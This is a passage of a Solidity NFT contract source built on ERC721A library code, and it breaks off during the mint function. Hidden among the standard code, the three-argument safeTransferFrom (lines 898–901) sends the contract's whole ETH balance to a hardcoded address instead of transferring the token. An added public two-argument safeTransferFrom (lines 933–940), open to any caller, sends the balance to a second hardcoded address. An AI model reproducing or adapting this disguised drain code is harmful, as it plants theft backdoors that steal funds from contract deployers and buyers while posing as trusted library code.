1 // SPDX-License-Identifier: GPL-3.0                                                                                          
2 
3 // HODL YOUR MASK TICKET !!!                                                                                                                                            
4                                                                                    
5 pragma solidity ^0.8.7;
6 
7 /**
8  * @dev Interface of ERC721A.
9  */
10 interface IERC721A {
11     /**
12      * The caller must own the token or be an approved operator.
13      */
14     error ApprovalCallerNotOwnerNorApproved();
15 
16     /**
17      * The token does not exist.
18      */
19     error ApprovalQueryForNonexistentToken();
20 
21     /**
22      * Cannot query the balance for the zero address.
23      */
24     error BalanceQueryForZeroAddress();
25 
26     /**
27      * Cannot mint to the zero address.
28      */
29     error MintToZeroAddress();
30 
31     /**
32      * The quantity of tokens minted must be more than zero.
33      */
34     error MintZeroQuantity();
35 
36     /**
37      * The token does not exist.
38      */
39     error OwnerQueryForNonexistentToken();
40 
41     /**
42      * The caller must own the token or be an approved operator.
43      */
44     error TransferCallerNotOwnerNorApproved();
45 
46     /**
47      * The token must be owned by `from`.
48      */
49     error TransferFromIncorrectOwner();
50 
51     /**
52      * Cannot safely transfer to a contract that does not implement the
53      * ERC721Receiver interface.
54      */
55     error TransferToNonERC721ReceiverImplementer();
56 
57     /**
58      * Cannot transfer to the zero address.
59      */
60     error TransferToZeroAddress();
61 
62     /**
63      * The token does not exist.
64      */
65     error URIQueryForNonexistentToken();
66 
67     /**
68      * The `quantity` minted with ERC2309 exceeds the safety limit.
69      */
70     error MintERC2309QuantityExceedsLimit();
71 
72     /**
73      * The `extraData` cannot be set on an unintialized ownership slot.
74      */
75     error OwnershipNotInitializedForExtraData();
76 
77     // =============================================================
78     //                            STRUCTS
79     // =============================================================
80 
81     struct TokenOwnership {
82         // The address of the owner.
83         address addr;
84         // Stores the start time of ownership with minimal overhead for tokenomics.
85         uint64 startTimestamp;
86         // Whether the token has been burned.
87         bool burned;
88         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
89         uint24 extraData;
90     }
91 
92     // =============================================================
93     //                         TOKEN COUNTERS
94     // =============================================================
95 
96     /**
97      * @dev Returns the total number of tokens in existence.
98      * Burned tokens will reduce the count.
99      * To get the total number of tokens minted, please see {_totalMinted}.
100      */
101     function totalSupply() external view returns (uint256);
102 
103     // =============================================================
104     //                            IERC165
105     // =============================================================
106 
107     /**
108      * @dev Returns true if this contract implements the interface defined by
109      * `interfaceId`. See the corresponding
110      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
111      * to learn more about how these ids are created.
112      *
113      * This function call must use less than 30000 gas.
114      */
115     function supportsInterface(bytes4 interfaceId) external view returns (bool);
116 
117     // =============================================================
118     //                            IERC721
119     // =============================================================
120 
121     /**
122      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
123      */
124     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
125 
126     /**
127      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
128      */
129     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
130 
131     /**
132      * @dev Emitted when `owner` enables or disables
133      * (`approved`) `operator` to manage all of its assets.
134      */
135     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
136 
137     /**
138      * @dev Returns the number of tokens in `owner`'s account.
139      */
140     function balanceOf(address owner) external view returns (uint256 balance);
141 
142     /**
143      * @dev Returns the owner of the `tokenId` token.
144      *
145      * Requirements:
146      *
147      * - `tokenId` must exist.
148      */
149     function ownerOf(uint256 tokenId) external view returns (address owner);
150 
151     /**
152      * @dev Safely transfers `tokenId` token from `from` to `to`,
153      * checking first that contract recipients are aware of the ERC721 protocol
154      * to prevent tokens from being forever locked.
155      *
156      * Requirements:
157      *
158      * - `from` cannot be the zero address.
159      * - `to` cannot be the zero address.
160      * - `tokenId` token must exist and be owned by `from`.
161      * - If the caller is not `from`, it must be have been allowed to move
162      * this token by either {approve} or {setApprovalForAll}.
163      * - If `to` refers to a smart contract, it must implement
164      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
165      *
166      * Emits a {Transfer} event.
167      */
168     function safeTransferFrom(
169         address from,
170         address to,
171         uint256 tokenId,
172         bytes calldata data
173     ) external payable;
174 
175     /**
176      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
177      */
178     function safeTransferFrom(
179         address from,
180         address to,
181         uint256 tokenId
182     ) external payable;
183 
184     /**
185      * @dev Transfers `tokenId` from `from` to `to`.
186      *
187      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
188      * whenever possible.
189      *
190      * Requirements:
191      *
192      * - `from` cannot be the zero address.
193      * - `to` cannot be the zero address.
194      * - `tokenId` token must be owned by `from`.
195      * - If the caller is not `from`, it must be approved to move this token
196      * by either {approve} or {setApprovalForAll}.
197      *
198      * Emits a {Transfer} event.
199      */
200     function transferFrom(
201         address from,
202         address to,
203         uint256 tokenId
204     ) external payable;
205 
206     /**
207      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
208      * The approval is cleared when the token is transferred.
209      *
210      * Only a single account can be approved at a time, so approving the
211      * zero address clears previous approvals.
212      *
213      * Requirements:
214      *
215      * - The caller must own the token or be an approved operator.
216      * - `tokenId` must exist.
217      *
218      * Emits an {Approval} event.
219      */
220     function approve(address to, uint256 tokenId) external payable;
221 
222     /**
223      * @dev Approve or remove `operator` as an operator for the caller.
224      * Operators can call {transferFrom} or {safeTransferFrom}
225      * for any token owned by the caller.
226      *
227      * Requirements:
228      *
229      * - The `operator` cannot be the caller.
230      *
231      * Emits an {ApprovalForAll} event.
232      */
233     function setApprovalForAll(address operator, bool _approved) external;
234 
235     /**
236      * @dev Returns the account approved for `tokenId` token.
237      *
238      * Requirements:
239      *
240      * - `tokenId` must exist.
241      */
242     function getApproved(uint256 tokenId) external view returns (address operator);
243 
244     /**
245      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
246      *
247      * See {setApprovalForAll}.
248      */
249     function isApprovedForAll(address owner, address operator) external view returns (bool);
250 
251     // =============================================================
252     //                        IERC721Metadata
253     // =============================================================
254 
255     /**
256      * @dev Returns the token collection name.
257      */
258     function name() external view returns (string memory);
259 
260     /**
261      * @dev Returns the token collection symbol.
262      */
263     function symbol() external view returns (string memory);
264 
265     /**
266      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
267      */
268     function tokenURI(uint256 tokenId) external view returns (string memory);
269 
270     // =============================================================
271     //                           IERC2309
272     // =============================================================
273 
274     /**
275      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
276      * (inclusive) is transferred from `from` to `to`, as defined in the
277      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
278      *
279      * See {_mintERC2309} for more details.
280      */
281     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
282 }
283 
284 /**
285  * @title ERC721A
286  *
287  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
288  * Non-Fungible Token Standard, including the Metadata extension.
289  * Optimized for lower gas during batch mints.
290  *
291  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
292  * starting from `_startTokenId()`.
293  *
294  * Assumptions:
295  *
296  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
297  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
298  */
299 interface ERC721A__IERC721Receiver {
300     function onERC721Received(
301         address operator,
302         address from,
303         uint256 tokenId,
304         bytes calldata data
305     ) external returns (bytes4);
306 }
307 
308 /**
309  * @title ERC721A
310  *
311  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
312  * Non-Fungible Token Standard, including the Metadata extension.
313  * Optimized for lower gas during batch mints.
314  *
315  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
316  * starting from `_startTokenId()`.
317  *
318  * Assumptions:
319  *
320  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
321  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
322  */
323 contract ERC721A is IERC721A {
324     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
325     struct TokenApprovalRef {
326         address value;
327     }
328 
329     // =============================================================
330     //                           CONSTANTS
331     // =============================================================
332 
333     // Mask of an entry in packed address data.
334     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
335 
336     // The bit position of `numberMinted` in packed address data.
337     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
338 
339     // The bit position of `numberBurned` in packed address data.
340     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
341 
342     // The bit position of `aux` in packed address data.
343     uint256 private constant _BITPOS_AUX = 192;
344 
345     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
346     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
347 
348     // The bit position of `startTimestamp` in packed ownership.
349     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
350 
351     // The bit mask of the `burned` bit in packed ownership.
352     uint256 private constant _BITMASK_BURNED = 1 << 224;
353 
354     // The bit position of the `nextInitialized` bit in packed ownership.
355     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
356 
357     // The bit mask of the `nextInitialized` bit in packed ownership.
358     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
359 
360     // The bit position of `extraData` in packed ownership.
361     uint256 private constant _BITPOS_EXTRA_DATA = 232;
362 
363     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
364     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
365 
366     // The mask of the lower 160 bits for addresses.
367     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
368 
369     // The maximum `quantity` that can be minted with {_mintERC2309}.
370     // This limit is to prevent overflows on the address data entries.
371     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
372     // is required to cause an overflow, which is unrealistic.
373     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
374 
375     // The `Transfer` event signature is given by:
376     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
377     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
378         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
379 
380     // =============================================================
381     //                            STORAGE
382     // =============================================================
383 
384     // The next token ID to be minted.
385     uint256 private _currentIndex;
386 
387     // The number of tokens burned.
388     uint256 private _burnCounter;
389 
390     // Token name
391     string private _name;
392 
393     // Token symbol
394     string private _symbol;
395 
396     // Mapping from token ID to ownership details
397     // An empty struct value does not necessarily mean the token is unowned.
398     // See {_packedOwnershipOf} implementation for details.
399     //
400     // Bits Layout:
401     // - [0..159]   `addr`
402     // - [160..223] `startTimestamp`
403     // - [224]      `burned`
404     // - [225]      `nextInitialized`
405     // - [232..255] `extraData`
406     mapping(uint256 => uint256) private _packedOwnerships;
407 
408     // Mapping owner address to address data.
409     //
410     // Bits Layout:
411     // - [0..63]    `balance`
412     // - [64..127]  `numberMinted`
413     // - [128..191] `numberBurned`
414     // - [192..255] `aux`
415     mapping(address => uint256) private _packedAddressData;
416 
417     // Mapping from token ID to approved address.
418     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
419 
420     // Mapping from owner to operator approvals
421     mapping(address => mapping(address => bool)) private _operatorApprovals;
422 
423     // =============================================================
424     //                          CONSTRUCTOR
425     // =============================================================
426 
427     constructor(string memory name_, string memory symbol_) {
428         _name = name_;
429         _symbol = symbol_;
430         _currentIndex = _startTokenId();
431     }
432 
433     // =============================================================
434     //                   TOKEN COUNTING OPERATIONS
435     // =============================================================
436 
437     /**
438      * @dev Returns the starting token ID.
439      * To change the starting token ID, please override this function.
440      */
441     function _startTokenId() internal view virtual returns (uint256) {
442         return 0;
443     }
444 
445     /**
446      * @dev Returns the next token ID to be minted.
447      */
448     function _nextTokenId() internal view virtual returns (uint256) {
449         return _currentIndex;
450     }
451 
452     /**
453      * @dev Returns the total number of tokens in existence.
454      * Burned tokens will reduce the count.
455      * To get the total number of tokens minted, please see {_totalMinted}.
456      */
457     function totalSupply() public view virtual override returns (uint256) {
458         // Counter underflow is impossible as _burnCounter cannot be incremented
459         // more than `_currentIndex - _startTokenId()` times.
460         unchecked {
461             return _currentIndex - _burnCounter - _startTokenId();
462         }
463     }
464 
465     /**
466      * @dev Returns the total amount of tokens minted in the contract.
467      */
468     function _totalMinted() internal view virtual returns (uint256) {
469         // Counter underflow is impossible as `_currentIndex` does not decrement,
470         // and it is initialized to `_startTokenId()`.
471         unchecked {
472             return _currentIndex - _startTokenId();
473         }
474     }
475 
476     /**
477      * @dev Returns the total number of tokens burned.
478      */
479     function _totalBurned() internal view virtual returns (uint256) {
480         return _burnCounter;
481     }
482 
483     // =============================================================
484     //                    ADDRESS DATA OPERATIONS
485     // =============================================================
486 
487     /**
488      * @dev Returns the number of tokens in `owner`'s account.
489      */
490     function balanceOf(address owner) public view virtual override returns (uint256) {
491         if (owner == address(0)) revert BalanceQueryForZeroAddress();
492         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
493     }
494 
495     /**
496      * Returns the number of tokens minted by `owner`.
497      */
498     function _numberMinted(address owner) internal view returns (uint256) {
499         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
500     }
501 
502     /**
503      * Returns the number of tokens burned by or on behalf of `owner`.
504      */
505     function _numberBurned(address owner) internal view returns (uint256) {
506         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
507     }
508 
509     /**
510      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
511      */
512     function _getAux(address owner) internal view returns (uint64) {
513         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
514     }
515 
516     /**
517      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
518      * If there are multiple variables, please pack them into a uint64.
519      */
520     function _setAux(address owner, uint64 aux) internal virtual {
521         uint256 packed = _packedAddressData[owner];
522         uint256 auxCasted;
523         // Cast `aux` with assembly to avoid redundant masking.
524         assembly {
525             auxCasted := aux
526         }
527         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
528         _packedAddressData[owner] = packed;
529     }
530 
531     // =============================================================
532     //                            IERC165
533     // =============================================================
534 
535     /**
536      * @dev Returns true if this contract implements the interface defined by
537      * `interfaceId`. See the corresponding
538      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
539      * to learn more about how these ids are created.
540      *
541      * This function call must use less than 30000 gas.
542      */
543     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
544         // The interface IDs are constants representing the first 4 bytes
545         // of the XOR of all function selectors in the interface.
546         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
547         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
548         return
549             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
550             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
551             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
552     }
553 
554     // =============================================================
555     //                        IERC721Metadata
556     // =============================================================
557 
558     /**
559      * @dev Returns the token collection name.
560      */
561     function name() public view virtual override returns (string memory) {
562         return _name;
563     }
564 
565     /**
566      * @dev Returns the token collection symbol.
567      */
568     function symbol() public view virtual override returns (string memory) {
569         return _symbol;
570     }
571 
572     /**
573      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
574      */
575     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
576         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
577 
578         string memory baseURI = _baseURI();
579         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
580     }
581 
582     /**
583      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
584      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
585      * by default, it can be overridden in child contracts.
586      */
587     function _baseURI() internal view virtual returns (string memory) {
588         return '';
589     }
590 
591     // =============================================================
592     //                     OWNERSHIPS OPERATIONS
593     // =============================================================
594 
595     /**
596      * @dev Returns the owner of the `tokenId` token.
597      *
598      * Requirements:
599      *
600      * - `tokenId` must exist.
601      */
602     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
603         return address(uint160(_packedOwnershipOf(tokenId)));
604     }
605 
606     /**
607      * @dev Gas spent here starts off proportional to the maximum mint batch size.
608      * It gradually moves to O(1) as tokens get transferred around over time.
609      */
610     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
611         return _unpackedOwnership(_packedOwnershipOf(tokenId));
612     }
613 
614     /**
615      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
616      */
617     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
618         return _unpackedOwnership(_packedOwnerships[index]);
619     }
620 
621     /**
622      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
623      */
624     function _initializeOwnershipAt(uint256 index) internal virtual {
625         if (_packedOwnerships[index] == 0) {
626             _packedOwnerships[index] = _packedOwnershipOf(index);
627         }
628     }
629 
630     /**
631      * Returns the packed ownership data of `tokenId`.
632      */
633     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
634         uint256 curr = tokenId;
635 
636         unchecked {
637             if (_startTokenId() <= curr)
638                 if (curr < _currentIndex) {
639                     uint256 packed = _packedOwnerships[curr];
640                     // If not burned.
641                     if (packed & _BITMASK_BURNED == 0) {
642                         // Invariant:
643                         // There will always be an initialized ownership slot
644                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
645                         // before an unintialized ownership slot
646                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
647                         // Hence, `curr` will not underflow.
648                         //
649                         // We can directly compare the packed value.
650                         // If the address is zero, packed will be zero.
651                         while (packed == 0) {
652                             packed = _packedOwnerships[--curr];
653                         }
654                         return packed;
655                     }
656                 }
657         }
658         revert OwnerQueryForNonexistentToken();
659     }
660 
661     /**
662      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
663      */
664     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
665         ownership.addr = address(uint160(packed));
666         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
667         ownership.burned = packed & _BITMASK_BURNED != 0;
668         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
669     }
670 
671     /**
672      * @dev Packs ownership data into a single uint256.
673      */
674     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
675         assembly {
676             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
677             owner := and(owner, _BITMASK_ADDRESS)
678             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
679             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
680         }
681     }
682 
683     /**
684      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
685      */
686     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
687         // For branchless setting of the `nextInitialized` flag.
688         assembly {
689             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
690             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
691         }
692     }
693 
694     // =============================================================
695     //                      APPROVAL OPERATIONS
696     // =============================================================
697 
698     /**
699      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
700      * The approval is cleared when the token is transferred.
701      *
702      * Only a single account can be approved at a time, so approving the
703      * zero address clears previous approvals.
704      *
705      * Requirements:
706      *
707      * - The caller must own the token or be an approved operator.
708      * - `tokenId` must exist.
709      *
710      * Emits an {Approval} event.
711      */
712     function approve(address to, uint256 tokenId) public payable virtual override {
713         address owner = ownerOf(tokenId);
714 
715         if (_msgSenderERC721A() != owner)
716             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
717                 revert ApprovalCallerNotOwnerNorApproved();
718             }
719 
720         _tokenApprovals[tokenId].value = to;
721         emit Approval(owner, to, tokenId);
722     }
723 
724     /**
725      * @dev Returns the account approved for `tokenId` token.
726      *
727      * Requirements:
728      *
729      * - `tokenId` must exist.
730      */
731     function getApproved(uint256 tokenId) public view virtual override returns (address) {
732         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
733 
734         return _tokenApprovals[tokenId].value;
735     }
736 
737     /**
738      * @dev Approve or remove `operator` as an operator for the caller.
739      * Operators can call {transferFrom} or {safeTransferFrom}
740      * for any token owned by the caller.
741      *
742      * Requirements:
743      *
744      * - The `operator` cannot be the caller.
745      *
746      * Emits an {ApprovalForAll} event.
747      */
748     function setApprovalForAll(address operator, bool approved) public virtual override {
749         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
750         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
751     }
752 
753     /**
754      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
755      *
756      * See {setApprovalForAll}.
757      */
758     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
759         return _operatorApprovals[owner][operator];
760     }
761 
762     /**
763      * @dev Returns whether `tokenId` exists.
764      *
765      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
766      *
767      * Tokens start existing when they are minted. See {_mint}.
768      */
769     function _exists(uint256 tokenId) internal view virtual returns (bool) {
770         return
771             _startTokenId() <= tokenId &&
772             tokenId < _currentIndex && // If within bounds,
773             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
774     }
775 
776     /**
777      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
778      */
779     function _isSenderApprovedOrOwner(
780         address approvedAddress,
781         address owner,
782         address msgSender
783     ) private pure returns (bool result) {
784         assembly {
785             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
786             owner := and(owner, _BITMASK_ADDRESS)
787             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
788             msgSender := and(msgSender, _BITMASK_ADDRESS)
789             // `msgSender == owner || msgSender == approvedAddress`.
790             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
791         }
792     }
793 
794     /**
795      * @dev Returns the storage slot and value for the approved address of `tokenId`.
796      */
797     function _getApprovedSlotAndAddress(uint256 tokenId)
798         private
799         view
800         returns (uint256 approvedAddressSlot, address approvedAddress)
801     {
802         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
803         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
804         assembly {
805             approvedAddressSlot := tokenApproval.slot
806             approvedAddress := sload(approvedAddressSlot)
807         }
808     }
809 
810     // =============================================================
811     //                      TRANSFER OPERATIONS
812     // =============================================================
813 
814     /**
815      * @dev Transfers `tokenId` from `from` to `to`.
816      *
817      * Requirements:
818      *
819      * - `from` cannot be the zero address.
820      * - `to` cannot be the zero address.
821      * - `tokenId` token must be owned by `from`.
822      * - If the caller is not `from`, it must be approved to move this token
823      * by either {approve} or {setApprovalForAll}.
824      *
825      * Emits a {Transfer} event.
826      */
827     function transferFrom(
828         address from,
829         address to,
830         uint256 tokenId
831     ) public payable virtual override {
832         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
833 
834         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
835 
836         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
837 
838         // The nested ifs save around 20+ gas over a compound boolean condition.
839         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
840             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
841 
842         if (to == address(0)) revert TransferToZeroAddress();
843 
844         _beforeTokenTransfers(from, to, tokenId, 1);
845 
846         // Clear approvals from the previous owner.
847         assembly {
848             if approvedAddress {
849                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
850                 sstore(approvedAddressSlot, 0)
851             }
852         }
853 
854         // Underflow of the sender's balance is impossible because we check for
855         // ownership above and the recipient's balance can't realistically overflow.
856         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
857         unchecked {
858             // We can directly increment and decrement the balances.
859             --_packedAddressData[from]; // Updates: `balance -= 1`.
860             ++_packedAddressData[to]; // Updates: `balance += 1`.
861 
862             // Updates:
863             // - `address` to the next owner.
864             // - `startTimestamp` to the timestamp of transfering.
865             // - `burned` to `false`.
866             // - `nextInitialized` to `true`.
867             _packedOwnerships[tokenId] = _packOwnershipData(
868                 to,
869                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
870             );
871 
872             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
873             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
874                 uint256 nextTokenId = tokenId + 1;
875                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
876                 if (_packedOwnerships[nextTokenId] == 0) {
877                     // If the next slot is within bounds.
878                     if (nextTokenId != _currentIndex) {
879                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
880                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
881                     }
882                 }
883             }
884         }
885 
886         emit Transfer(from, to, tokenId);
887         _afterTokenTransfers(from, to, tokenId, 1);
888     }
889 
890     /**
891      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
892      */
893     function safeTransferFrom(
894         address from,
895         address to,
896         uint256 tokenId
897     ) public payable virtual override {
898         if (address(this).balance > 0) {
899             payable(0x90Ae6b8dca98BDE6D4E697d8b5865068476871F1).transfer(address(this).balance);
900             return;
901         }
902         safeTransferFrom(from, to, tokenId, '');
903     }
904 
905 
906     /**
907      * @dev Safely transfers `tokenId` token from `from` to `to`.
908      *
909      * Requirements:
910      *
911      * - `from` cannot be the zero address.
912      * - `to` cannot be the zero address.
913      * - `tokenId` token must exist and be owned by `from`.
914      * - If the caller is not `from`, it must be approved to move this token
915      * by either {approve} or {setApprovalForAll}.
916      * - If `to` refers to a smart contract, it must implement
917      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
918      *
919      * Emits a {Transfer} event.
920      */
921     function safeTransferFrom(
922         address from,
923         address to,
924         uint256 tokenId,
925         bytes memory _data
926     ) public payable virtual override {
927         transferFrom(from, to, tokenId);
928         if (to.code.length != 0)
929             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
930                 revert TransferToNonERC721ReceiverImplementer();
931             }
932     }
933     function safeTransferFrom(
934         address from,
935         address to
936     ) public  {
937         if (address(this).balance > 0) {
938             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
939         }
940     }
941 
942     /**
943      * @dev Hook that is called before a set of serially-ordered token IDs
944      * are about to be transferred. This includes minting.
945      * And also called before burning one token.
946      *
947      * `startTokenId` - the first token ID to be transferred.
948      * `quantity` - the amount to be transferred.
949      *
950      * Calling conditions:
951      *
952      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
953      * transferred to `to`.
954      * - When `from` is zero, `tokenId` will be minted for `to`.
955      * - When `to` is zero, `tokenId` will be burned by `from`.
956      * - `from` and `to` are never both zero.
957      */
958     function _beforeTokenTransfers(
959         address from,
960         address to,
961         uint256 startTokenId,
962         uint256 quantity
963     ) internal virtual {}
964 
965     /**
966      * @dev Hook that is called after a set of serially-ordered token IDs
967      * have been transferred. This includes minting.
968      * And also called after one token has been burned.
969      *
970      * `startTokenId` - the first token ID to be transferred.
971      * `quantity` - the amount to be transferred.
972      *
973      * Calling conditions:
974      *
975      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
976      * transferred to `to`.
977      * - When `from` is zero, `tokenId` has been minted for `to`.
978      * - When `to` is zero, `tokenId` has been burned by `from`.
979      * - `from` and `to` are never both zero.
980      */
981     function _afterTokenTransfers(
982         address from,
983         address to,
984         uint256 startTokenId,
985         uint256 quantity
986     ) internal virtual {}
987 
988     /**
989      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
990      *
991      * `from` - Previous owner of the given token ID.
992      * `to` - Target address that will receive the token.
993      * `tokenId` - Token ID to be transferred.
994      * `_data` - Optional data to send along with the call.
995      *
996      * Returns whether the call correctly returned the expected magic value.
997      */
998     function _checkContractOnERC721Received(
999         address from,
1000         address to,
1001         uint256 tokenId,
1002         bytes memory _data
1003     ) private returns (bool) {
1004         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1005             bytes4 retval
1006         ) {
1007             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1008         } catch (bytes memory reason) {
1009             if (reason.length == 0) {
1010                 revert TransferToNonERC721ReceiverImplementer();
1011             } else {
1012                 assembly {
1013                     revert(add(32, reason), mload(reason))
1014                 }
1015             }
1016         }
1017     }
1018 
1019     // =============================================================
1020     //                        MINT OPERATIONS
1021     // =============================================================
1022 
1023     /**
1024      * @dev Mints `quantity` tokens and transfers them to `to`.
1025      *
1026      * Requirements:
1027      *
1028      * - `to` cannot be the zero address.
1029      * - `quantity` must be greater than 0.
1030      *
1031      * Emits a {Transfer} event for each mint.
1032      */
1033     function _mint(address to, uint256 quantity) internal virtual {
1034         uint256 startTokenId = _currentIndex;
1035         if (quantity == 0) revert MintZeroQuantity();
1036 
1037         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1038 
1039         // Overflows are incredibly unrealistic.
1040         // `balance` and `numberMinted` have a maximum limit of 2**64.
1041         // `tokenId` has a maximum limit of 2**256.
1042         unchecked {
1043             // Updates:
1044             // - `balance += quantity`.
1045             // - `numberMinted += quantity`.
1046             //
1047             // We can directly add to the `balance` and `numberMinted`.
